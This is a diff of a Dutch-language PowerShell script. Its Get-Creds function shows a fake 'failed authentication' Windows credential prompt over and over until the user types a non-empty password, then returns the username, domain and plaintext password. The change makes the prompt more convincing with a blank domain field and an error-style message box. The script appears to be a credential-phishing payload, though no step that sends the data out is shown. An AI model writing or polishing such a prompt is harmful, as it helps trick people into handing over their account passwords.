@@ -9,7 +9,7 @@ if (Test-Path -Path $FullPath) {
     exit
 }
 
-# Functie: Vraag om gebruikersreferenties
+# Functie: Vraag om gebruikersreferenties (wachtwoord mag niet leeg zijn)
 function Get-Creds {
     Add-Type -AssemblyName System.Windows.Forms
     while ($true) {
@@ -17,18 +17,20 @@ function Get-Creds {
             'Mislukte authenticatie', 
             'Voer uw referenties in om verder te gaan.', 
             [Environment]::UserDomainName + '\' + [Environment]::UserName, 
-            [Environment]::UserDomainName
+            ""
         )
 
-        if (![string]::IsNullOrWhiteSpace($cred.Password)) {
+        $password = $cred.GetNetworkCredential().Password
+
+        # Controleer of het wachtwoord leeg is
+        if (![string]::IsNullOrWhiteSpace($password)) {
             return @{
                 Gebruikersnaam = $cred.UserName
-                Wachtwoord = $cred.GetNetworkCredential().Password
+                Wachtwoord = $password
                 Domein = $cred.GetNetworkCredential().Domain
             }
-        }
-        else {
-            [System.Windows.Forms.MessageBox]::Show("Het wachtwoord mag niet leeg zijn. Probeer het opnieuw.")
+        } else {
+            [System.Windows.Forms.MessageBox]::Show("Het wachtwoord mag niet leeg zijn. Probeer het opnieuw.", "Fout", 0, 16)
         }
     }
 }
